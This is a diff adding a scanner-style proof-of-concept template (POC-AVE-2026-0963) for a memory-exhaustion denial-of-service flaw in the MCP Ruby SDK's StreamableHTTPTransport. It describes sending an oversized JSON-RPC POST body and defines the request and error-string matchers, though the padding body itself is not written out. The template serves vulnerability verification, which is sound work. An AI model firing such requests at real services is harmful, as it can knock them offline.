@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "向 MCP Ruby SDK StreamableHTTPTransport 发送超大 JSON-RPC POST 请求体，验证未限制请求体大小导致的内存耗尽拒绝服务漏洞。发送包含大量填充数据的 POST 请求，目标进程内存占用激增直至 OOM。"
+id = "POC-AVE-2026-0963"
+name = "MCP Ruby SDK StreamableHTTPTransport 拒绝服务 PoC"
+severity = "high"
+tags = ["ave-2026-0963"]
+vuln_id = [
+    "CVE-2026-67432",
+    "AVE-2026-0963",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mcp"
+protocol = "http"
+
+[poc.requests.body]
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Internal Server Error",
+    "502",
+    "503",
+    "connection refused",
+]
